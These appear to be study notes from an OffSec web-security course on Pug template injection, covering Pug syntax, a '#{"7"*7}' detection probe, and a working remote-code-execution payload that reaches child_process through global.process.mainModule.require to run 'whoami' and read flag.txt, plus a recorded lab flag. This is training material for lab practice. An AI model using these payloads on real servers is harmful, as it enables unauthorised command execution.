

This Learning Unit covers the following Learning Objectives:

1. Understand the basic syntax of Pug
2. Understand how to discover a Pug template in a black box scenario
3. Understand how to reach RCE with a Pug Template

-----------

#### Pug Discovery
_Pug_, previously known asÂ _Jade_,[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-1)Â is a JavaScript templating engine.

While Pug is most commonly used for server-side templating, it also supports compiling templates for client-side rendering. Pug is commonly integrated with theÂ _Express_[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-2)Â framework in aÂ _NodeJS_[3](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-3)Â application.

The syntax for Pug templates is significantly different than the other templating engines we have reviewed so far. This is because Pug is specially-designed to generate HTML files. Even its documentation for plain text[4](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_174-4)Â discusses how to add plain text into an HTML document.

Because of its design, Pug has syntax for specifying an HTML tag and tag attributes. Its method for defining a statement and expression is also different than other templating engines. Let's review a template and break down each section. We can find it in the sandbox by visitingÂ `/pug`.

```js
01   h1 Hello, #{name}
02   input(type='hidden' name='admin' value='true')
03 
04   if showSecret
05     - secret = ['â¤ï¸','ğŸ˜', 'ğŸ¤Ÿ']
06     p The secrets are: 
07     each val in secret
08       p #{val}
09   else
10    p No secret for you!
```

This template is executed in conjunction with a couple of variables.
![[Pasted image 20241024215815.png]]
The template begins with an expression to display an HTML H1 tag that greets the user with their name.
```js
01   h1 Hello, #{name}
...
```

We'll notice an expression in this first line. The default delimiter in Pug is a number sign and an open curly bracket (#{), with the closing delimiter being only a closed curly bracket (}). It's also interesting to us that Pug requires the first word to be the HTML tag that will wrap the following data, as shown in Listing 24.

The content after the initial h1 will become wrapped in `<h1>` tags. While h1 is a common HTML tag, custom values could be found here, too. For example, if we started the line withÂ _foo_, the contents after the first word would be wrapped in a tag named "foo".

HTML tags often require additional attributes. Pug allows us to pass attributes in parentheses after the tag declaration, as shown in the second line of the template.

```js
02   input(type='hidden' name='admin' value='true')
```

We'll observe in Listing 25 that this HTML tag contains three attributes: type, name, and value. Since the type is "hidden", this element won't display when the HTML is rendered.

Following the input tag, we find anÂ _if_Â statement.

```js
04   if showSecret
...
09   else
10     p No secret for you!
```

TheÂ _showSecret_Â variable is set to "true" in this template, meaning the first part of theÂ _if_Â statement will be rendered. One interesting component of Pug is that keywords like "if" and "else" have specific meanings and are not treated as HTML tags. Instead, they are treated as statements. This is different than the other templating engines we have reviewed because there is no special delimiter that treats statements and expressions differently.

Pug can also execute JavaScript code directly, a feature we'll find to be very useful later. We can observe this within the first line of theÂ _if_Â statement.

```js
05     - secret = ['â¤ï¸','ğŸ˜', 'ğŸ¤Ÿ']
```
In Listing 27, we are setting aÂ _secret_Â variable to an Array. Using the dash character (-) in front of Pug indicates that the code should be executed by the JavaScript engine and the output should not be displayed (unbuffered code[5](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_63-5)).

Pug also supports buffered code, which displays the output of the command. We can instruct Pug to run as buffered code by using an equal sign instead of the dash.

```js
= secret = ['â¤ï¸','ğŸ˜', 'ğŸ¤Ÿ']
```

Let's replace the dash with an equal sign in the template. We should observe the array displayed on the page.
![[Pasted image 20241024220806.png]]
Finally, we find a loop in the Pug template that iterates through theÂ _secret_Â array and displays each element on the page.
```js
07     each val in secret
08       p #{val}
```
As with theÂ _if_Â statement, theÂ _each_Â keyword has a special meaning and its contents will not be used to create an HTML tag. Instead, each value within theÂ _secret_Â array will be shown in an HTMLÂ _p_Â tag.

Now that we better understand how Pug works, let's think about how we could discover it on a target. Because Pug uses a format that's different from most popular templating engines, we can check the first word of a target template's new line to determine if it wraps its contents in HTML tags. If so, we're likely to be dealing with Pug.

We'll use the payloadÂ `#{"7"*7}Â `for a couple of reasons. First, if the output is "49", we'll know that we are most likely dealing with a language that is not strictly handling variables, like JavaScript or PHP. Next, since Pug expects the first word of a line to be a tag, it will encompass this in < and > signs. Let's use this payload in the sandbox and review the output.

![[Pasted image 20241024221052.png]]
As shown in the image, "<49>" is displayed, indicating that this is most likely a Pug templating engine.

Go toÂ http://template-sandbox/pugÂ for the following exercise.

##### Labs
`OS{VanGogh}`
![[Pasted image 20241024221757.png]]

```js
h1 Hello, #{SECRET_STRING}
input(type='hidden' name='admin' value='true')

if SECRET_STRING
  - secret = ['â¤ï¸','ğŸ˜', 'ğŸ¤Ÿ']
  p The secrets are: 
  each val in secret
    p #{val}
else
  p No secret for you!
```
![[Pasted image 20241024221840.png]]

----------
#### 11.4.2. Pug - Exploitation
The payload to execute code via Pug is, in some ways, more straightforward than others, since Pug allows for more direct access to the underlying JavaScript programming language. Because Pug is rendering on the server-side, we know we're typically working with NodeJS.

Searching for "NodeJS execute System Command", we'll find the documentation for theÂ _child_process.spawnSync_Â command, which executes system commands on the target.[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-discovery-30983#fn-local_id_71-1)Â Once the command executes, we can accessÂ _stdout_Â to read the output of the command. TheÂ _child_process_Â module isn't accessible by default. Instead, we will need to use theÂ `require`Â function to import it. Let's find out if we have access to theÂ `require`Â function first. We'll use the buffered code feature of Pug to read the output ofÂ `require`Â if it exists.

![[Pasted image 20241024222135.png]]

Unfortunately, the output was empty. This most likely means we don't have direct access toÂ _require_. However, we can try to accessÂ _require_Â from the global object. While we don't need to develop a deep understanding of why this global object exists, we should know that in NodeJS,Â _global_Â is similar to the browser'sÂ _window_Â object. If we indeed have access to theÂ _global_Â object, we can accessÂ _require_Â by typingÂ `global.process.mainModule.require`.

![[Pasted image 20241024222307.png]]

This time, the source code of theÂ _require_Â function is returned! We can create a new variable namedÂ _require_Â and set its value to theÂ _global.process.mainModule.require_Â function. We can now attempt to import "child_process" again. We'll set theÂ _require_Â variable in an unbuffered code statement since we don't need the output.

```js
- var require = global.process.mainModule.require
= require('child_process')
```

We'll run the payload in Listing 30 within the sandbox.

![[Pasted image 20241024222718.png]]

While the `"[object Object]"` output might not seem interesting, this confirms we have imported theÂ `child_process`Â object. All that's left to execute commands on the target is to run a command usingÂ `spawnSync`Â and access the output with stdout.

```js
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout
```

Again, we'll run the payload in Listing 31 in the sandbox.

![[Pasted image 20241024222828.png]]

Nice! We're able to inject into a Pug template to execute commands on the system.

Go toÂ `http://template-sandbox/pug`Â for the following exercise.

(Nodejs, 2021),Â [https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options](https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options)Â [â†©ï¸](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/pug-discovery-and-exploitation-31315/pug-exploitation-30979#fnref-local_id_71-1)


##### Labs
![[Pasted image 20241024223826.png]]
```js
- var require = global.process.mainModule.require
- var flag = require('child_process').spawnSync('cat', ['flag.txt']).stdout.toString()
= flag
```
Explanation:
Googling Node JS shows ways to format this as well.
![[Pasted image 20241024223640.png]]
flag
![[Pasted image 20241024223920.png]]